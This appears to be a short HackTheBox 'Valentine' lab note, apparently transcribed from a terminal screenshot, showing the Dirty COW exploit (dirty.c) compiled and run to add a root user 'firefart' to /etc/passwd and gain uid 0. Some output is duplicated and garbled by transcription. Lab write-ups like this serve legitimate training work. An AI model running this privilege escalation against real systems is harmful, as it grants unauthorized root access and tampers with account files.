![](Maszyny/Linux/Valentine/Pasted%20image%2020210818021809.png)

hypeavalentine:/tmp/pp$ vi dirty.c
hypeavalentine:/tmp/pp$ rm dirty
hypeavalentine:/tmp/pp$ gcc -pthread dirty.c-o dirty -lcrypt
hypeavalentine:/tmp/pp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi6b59A.C7BDQ:0:0:pwned:/root:/bin/bash
mmap: 7f915af3f000
id
su firefart
test
id
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.
DON'T FORGET TO RESTORE! $ mv /tmp/passwd. bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
hypeavalentine:/tmp/pp$ id
uid=1000( hype) gid=1000( hype) groups=1000( hype), 24(cdrom), 30(dip), 46(plugdev), 124( sambashare)
hypeavalentine:/tmp/pp$ su firefart
Password:
firefartavalentine:/tmp/pp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefartavalentine:/tmp/pp#
HTB | 18h 24m 1 sudo 2 ssh
